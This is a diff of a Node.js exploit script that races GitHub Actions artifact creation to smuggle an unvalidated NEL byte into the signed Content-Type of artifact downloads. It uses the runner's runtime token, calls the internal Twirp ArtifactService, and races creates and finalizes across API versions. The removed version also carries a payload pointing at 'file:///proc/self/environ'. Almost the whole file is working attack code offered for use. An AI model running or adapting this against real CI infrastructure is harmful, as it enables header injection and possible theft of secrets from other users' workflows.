@@ -1,7 +1,6 @@
-// TOCTOU race on artifact mime_type validation vs the signed rsct.
-// Hypothesis: CreateArtifact validates mime_type, but if two creates share the
-// same (run,name), the signed rsct that the download URL later reads can be
-// poisoned with a NEL value that never passed validation.
+// v6/v7 confusion race: v6 accepts an unvalidated NEL mime; v7 applies the
+// stored mime as rsct. Create the SAME name as both, race the finalizes, and
+// check whether any resulting artifact serves a Content-Type carrying 0x85.
 import crypto from 'node:crypto';
 import https from 'node:https';
 
@@ -10,19 +9,14 @@ const RT = process.env.ACTIONS_RUNTIME_TOKEN;
 const GH = process.env.GH_TOKEN;
 const REPO = process.env.GITHUB_REPOSITORY;
 if (!RESULTS || !RT) { console.log('FATAL missing ACTIONS_* env'); process.exit(1); }
-
 const claims = JSON.parse(Buffer.from(RT.split('.')[1], 'base64url').toString());
 const scope = String(claims.scp || '').split(' ').find(s => s.startsWith('Actions.Results:'));
 const [, runId, jobId] = scope.split(':');
 
-const NEL = '\u0085';
+const WEIRD = '\u0085application/json';   // leading NEL
 const CLEAN = 'application/json';
-const DIRTY = 'application/json' + NEL;          // JSON.stringify -> wire C2 85
-const ROUNDS = Number(process.env.ROUNDS || 48);
-
-const BODY = Buffer.from(JSON.stringify({
-  full_name: REPO, owner: { login: 'z', avatar_url: 'file:///proc/self/environ' },
-}), 'utf8');
+const ROUNDS = Number(process.env.ROUNDS || 64);
+const PLACEHOLDER = Buffer.from('{"probe":"placeholder"}');
 
 function twirp(method, body) {
   return fetch(`${RESULTS.replace(/\/?$/, '/')}twirp/github.actions.results.api.v1.ArtifactService/${method}`, {
@@ -31,27 +25,34 @@ function twirp(method, body) {
     body: JSON.stringify(body),
   }).then(async r => ({ status: r.status, text: await r.text() }));
 }
-function put(url, data) {
+function put(url, data, ct) {
   return new Promise((resolve, reject) => {
     const u = new URL(url);
-    const req = https.request({ method: 'PUT', hostname: u.hostname, path: u.pathname + u.search,
-      headers: { 'x-ms-blob-type': 'BlockBlob', 'x-ms-version': '2021-08-06', 'Content-Length': Buffer.byteLength(data) } },
+    const h = { 'x-ms-blob-type': 'BlockBlob', 'x-ms-version': '2021-08-06', 'Content-Length': Buffer.byteLength(data) };
+    if (ct) h['x-ms-blob-content-type'] = ct;
+    const req = https.request({ method: 'PUT', hostname: u.hostname, path: u.pathname + u.search, headers: h },
       res => { res.resume(); res.on('end', () => resolve(res.statusCode)); });
     req.on('error', reject); req.write(data); req.end();
   });
 }
+function create(name, version, mime) {
+  return twirp('CreateArtifact', { workflow_run_backend_id: runId, workflow_job_run_backend_id: jobId, name, version, mime_type: mime });
+}
+function finalize(name, bytes) {
+  return twirp('FinalizeArtifact', { workflow_run_backend_id: runId, workflow_job_run_backend_id: jobId, name,
+    size: String(bytes.length), hash: `sha256:${crypto.createHash('sha256').update(bytes).digest('hex')}` });
+}
 function restDownload(id) {
   return new Promise(resolve => {
-    https.request({ method: 'GET', hostname: 'api.github.com',
-      path: `/repos/${REPO}/actions/artifacts/${id}/zip`,
-      headers: { Accept: 'application/vnd.github.v3+json', Authorization: `Bearer ${GH}`, 'User-Agent': 'race' } },
+    https.request({ method: 'GET', hostname: 'api.github.com', path: `/repos/${REPO}/actions/artifacts/${id}/zip`,
+      headers: { Accept: 'application/vnd.github.v3+json', Authorization: `Bearer ${GH}`, 'User-Agent': 'race2' } },
       res => {
         res.resume();
         const loc = res.headers.location;
         if (!loc) return resolve({ noloc: res.statusCode });
         const u = new URL(loc);
         const rsct = (u.search.match(/[?&]rsct=([^&]*)/) || [])[1] || '';
-        https.get({ hostname: u.hostname, path: u.pathname + u.search, headers: { 'User-Agent': 'race' } }, r2 => {
+        https.get({ hostname: u.hostname, path: u.pathname + u.search, headers: { 'User-Agent': 'race2' } }, r2 => {
           r2.resume();
           const ct = r2.headers['content-type'] || '';
           resolve({ rsct, ct, hex: Buffer.from(ct, 'latin1').toString('hex'), nel: Buffer.from(ct, 'latin1').includes(0x85) });
@@ -62,26 +63,25 @@ function restDownload(id) {
 
 const winners = [];
 for (let i = 0; i < ROUNDS; i++) {
-  const name = `race-${i}-${Date.now()}`;
-  // fire clean + dirty create CONCURRENTLY on the same name
-  const [c1, c2] = await Promise.all([
-    twirp('CreateArtifact', { workflow_run_backend_id: runId, workflow_job_run_backend_id: jobId, name, version: 7, mime_type: CLEAN }),
-    twirp('CreateArtifact', { workflow_run_backend_id: runId, workflow_job_run_backend_id: jobId, name, version: 7, mime_type: DIRTY }),
-  ]);
-  // whichever create returned a SAS, upload + finalize it
-  let sas = null;
-  for (const c of [c1, c2]) { if (c.status === 200) { try { sas = JSON.parse(c.text).signed_upload_url; } catch {} if (sas) break; } }
-  if (!sas) { console.log(`r${i} c1=${c1.status} c2=${c2.status} NO-SAS`); continue; }
-  await put(sas, BODY);
-  const fin = await twirp('FinalizeArtifact', { workflow_run_backend_id: runId, workflow_job_run_backend_id: jobId, name,
-    size: BODY.length, hash: `sha256:${crypto.createHash('sha256').update(BODY).digest('hex')}` });
-  if (fin.status !== 200) { console.log(`r${i} c1=${c1.status} c2=${c2.status} fin=${fin.status}`); continue; }
-  const id = JSON.parse(fin.text).artifact_id;
-  await new Promise(r => setTimeout(r, 1200));
-  const d = await restDownload(id);
-  console.log(`r${i} c1=${c1.status} c2=${c2.status} id=${id} rsct=${(d.rsct||'').slice(0,30)} hex=${(d.hex||'').slice(0,40)} NEL=${d.nel}`);
-  if (d.nel) winners.push({ i, id, ...d });
+  const name = `cr-${i}-${Date.now()}`;
+  const reverse = i % 2 === 1;
+  const specs = reverse ? [[7, CLEAN], [6, WEIRD]] : [[6, WEIRD], [7, CLEAN]];
+  try {
+    const created = await Promise.all(specs.map(([v, m]) => create(name, v, m)));
+    const sas = created.map(c => { try { return JSON.parse(c.text).signed_upload_url; } catch { return null; } });
+    if (sas.some(s => !s)) { console.log(`r${i} create status=${created.map(c=>c.status)} NO-SAS`); continue; }
+    await Promise.all(sas.map(s => put(s, PLACEHOLDER, WEIRD)));
+    const fin = await Promise.allSettled([finalize(name, PLACEHOLDER), finalize(name, PLACEHOLDER)]);
+    const ids = [...new Set(fin.filter(f => f.status === 'fulfilled' && f.value.status === 200)
+      .map(f => { try { return JSON.parse(f.value.text).artifact_id; } catch { return null; } }).filter(Boolean))];
+    if (!ids.length) { console.log(`r${i} fin=${fin.map(f=>f.status==='fulfilled'?f.value.status:'rej')} NO-ID`); continue; }
+    for (const id of ids) {
+      const d = await restDownload(id);
+      console.log(`r${i} rev=${reverse} id=${id} rsct=${(d.rsct||'').slice(0,34)} hex=${(d.hex||'').slice(0,44)} NEL=${d.nel}`);
+      if (d.nel) winners.push({ i, id, ...d });
+    }
+  } catch (e) { console.log(`r${i} EXC ${String(e).slice(0,80)}`); }
 }
 console.log(`\n=== WINNERS ${winners.length} ===`);
 for (const w of winners) console.log('WINNER ' + JSON.stringify(w));
-console.log(winners.length ? '*** CARRIER FOUND ***' : 'none');
+console.log(winners.length ? '*** NEL rsct ACHIEVED ***' : 'none');
